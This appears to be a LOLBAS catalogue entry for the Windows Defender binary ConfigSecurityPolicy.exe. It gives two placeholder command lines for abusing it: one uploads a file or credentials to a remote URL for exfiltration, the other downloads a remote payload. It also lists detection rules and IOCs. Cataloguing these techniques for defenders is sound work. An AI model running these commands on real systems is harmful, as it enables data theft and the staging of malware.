---
Acknowledgement:
- Handle: '@NtSetDefault'
  Person: Ialle Teixeira
- Person: Nir Chako (Pente
Author: Ialle Teixeira
Commands:
- Category: Upload
  Command: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
  Description: Upload file, credentials or data exfiltration in general
  MitreID: T1567
  OperatingSystem: Windows 10
  Privileges: User
  Usecase: Upload file
- Category: Download
  Command: ConfigSecurityPolicy.exe {REMOTEURL}
  Description: It will download a remote payload and place it in INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Downloads payload from remote server
Created: 2020-09-04
Description: Binary part of Windows Defender. Used to manage settings in Windows Defender.
  You can configure different pilot collections for each of the co-management workloads.
  Being able to use different pilot collections allows you to take a more granular
  approach when shifting workloads.
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_configsecuritypolicy.yml
- IOC: ConfigSecurityPolicy storing data into alternate data streams.
- IOC: Preventing/Detecting ConfigSecurityPolicy with non-RFC1918 addresses by Network
    IPS/IDS.
- IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching
    ConfigSecurityPolicy.exe.
- IOC: User Agent is "MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C;
    .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
Full_Path:
- Path: C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe
- Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe
Name: ConfigSecurityPolicy.exe
Resources:
- Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads
- Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads
- Link: https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor
- Link: https://twitter.com/NtSetDefault/status/1302589153570365440?s=20
mitre_data:
  technique_ids:
  - T1567
  - T1105
tags:
- lolbas/osbinaries
---

# ConfigSecurityPolicy.exe

Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.

# Path(s)

- `C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe`
- `C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\ConfigSecurityPolicy.exe`

# Upload Commands

Upload file, credentials or data exfiltration in general

```batch
ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
```

- **Usecase:** Upload file
- **Privileges Required:** User
- **MitreID:** `T1567`
- **Operating System(s):** Windows 10



# Download Commands

It will download a remote payload and place it in INetCache.

```batch
ConfigSecurityPolicy.exe {REMOTEURL}
```

- **Usecase:** Downloads payload from remote server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-switch-workloads
- https://docs.microsoft.com/en-US/mem/configmgr/comanage/workloads
- https://docs.microsoft.com/en-US/mem/configmgr/comanage/how-to-monitor
- https://twitter.com/NtSetDefault/status/1302589153570365440?s=20
# Acknowledgements

- Ialle Teixeira (Authored, 2020-09-04)
- Ialle Teixeira (@NtSetDefault)
- Nir Chako (Pente